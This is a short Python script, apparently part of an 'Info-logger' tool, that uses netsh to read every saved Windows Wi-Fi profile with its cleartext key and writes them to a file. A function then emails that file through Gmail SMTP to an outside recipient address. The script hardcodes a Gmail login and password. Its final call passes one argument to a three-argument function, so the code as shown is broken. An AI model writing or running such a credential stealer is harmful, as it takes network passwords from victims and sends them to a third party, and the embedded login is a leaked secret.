from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import subprocess

wifi_password = "wifi_password.txt"
wifi_password_e = 'e_wifi_password.txt'

file_path =  "C:\\Info-logger\\Logged_information" 
extend = "\\"
file_merge = file_path + extend

file_path =  "C:\\Info-logger\\Logged_information"
extend = "\\"
file_merge = file_path + extend

email_address = "saidevesh2009@gmail.com"
password = "ApfApf_78"

toaddr = "ronom12786@yasiok.com"

def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, "rb")

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()

with open(file_path + extend + wifi_password, "w") as f:
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
            '\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            f.write("{:<30} -  {:<}\n".format(i, results[0]))
        except IndexError:
            f.write("{:<30} -  {:<}\n".format(i, ""))
            
send_email(wifi_password)